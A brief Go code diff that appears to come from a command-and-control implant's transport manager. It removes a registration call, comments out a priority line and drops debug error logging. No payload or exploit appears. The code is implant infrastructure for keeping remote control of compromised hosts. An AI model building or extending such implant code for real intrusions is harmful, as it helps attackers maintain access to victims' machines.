@@ -100,9 +100,6 @@ func (t *c2s) Init() (err error) {
 		Transports.Server = transport
 		t.mutex.RUnlock()
 
-		// Send the registration message, and break
-		// the loop as we successfully connected
-		transport.Register()
 		break
 	}
 
@@ -131,6 +128,7 @@ func (t *c2s) AddFromProfile(profile string) (err error) {
 // Add - Add a new active transport to the implant' transport map.
 func (t *c2s) Add(c2 *C2) (err error) {
 	t.mutex.Lock()
+	// index := c2.Priority
 	t.Available = append(t.Available, c2)
 	t.mutex.Unlock()
 	return
@@ -221,11 +219,6 @@ func (t *c2s) Shutdown() (err error) {
 
 	// Close the server transport
 	err = t.Server.Stop()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf(err.Error())
-		// {{end}}
-	}
 
 	// Release lock on the implant main if asked to
 	// if exit {
